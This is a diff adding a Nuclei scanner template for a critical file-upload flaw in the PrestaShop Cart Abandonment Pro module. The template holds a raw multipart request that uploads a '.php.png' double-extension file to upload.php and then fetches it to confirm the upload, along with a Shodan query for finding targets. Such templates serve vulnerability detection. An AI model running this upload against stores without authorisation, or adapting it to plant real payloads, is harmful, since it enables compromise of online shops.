@@ -1,0 +1,81 @@
+id: prestashop-cartabandonmentpro-file-upload
+
+info:
+  name: Prestashop Cart Abandonment Pro File Upload
+  author: MaStErChO
+  severity: critical
+  reference:
+    - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/
+    - https://dh42.com/blog/prestashop-security/
+  metadata:
+    verified: true
+    max-request: 2
+    framework: prestashop
+    shodan-query: "http.component:\"prestashop\""
+    product: ap_pagebuilder
+    vendor: apollotheme
+  tags: intrusive,file-upload,cartabandonmentpro,prestashop
+
+flow: http(1) && http(2)
+
+variables:
+  filename: '{{rand_base(7, "abc")}}'
+  string: '{{rand_base(7, "abc")}}'
+
+http:
+  - raw:
+      - |
+        POST /modules/{{paths}}/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=xYzZY
+
+        --xYzZY
+        Content-Disposition: form-data; name="image"; filename="{{filename}}.php.png"
+        Content-Type: image/png
+
+        <html>
+        <!-- {{string}} -->
+        </html>
+
+        --xYzZY--
+
+    payloads:
+      paths:
+        - 'cartabandonmentpro'
+        - 'cartabandonmentproOld'
+        - 'cartabandonmentpro_Old'
+        - 'cartabandonmentpro2'
+        - 'pscartabandonmentpro'
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(content_type, "text/html")'
+          - 'contains(body, "{{filename}}.php.png")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        internal: true
+        regex:
+          - '\/modules\/([^\/]+)\/'
+
+  - raw:
+      - |
+        GET {{matched_path}}uploads/{{filename}}.php.png HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(content_type, "image/png")'
+          - 'contains(body, "{{string}}")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4a0a004730450220427a2bd4285db3172e25282ea879424f5d2b33b1c7ce8466b8ef2fb6cfb3cc9f022100878a735dc3c5921b1a7377030825e0a0e74d388749889fcf454e96573a88ea54:922c64590222798bb761d5b6d8e72950
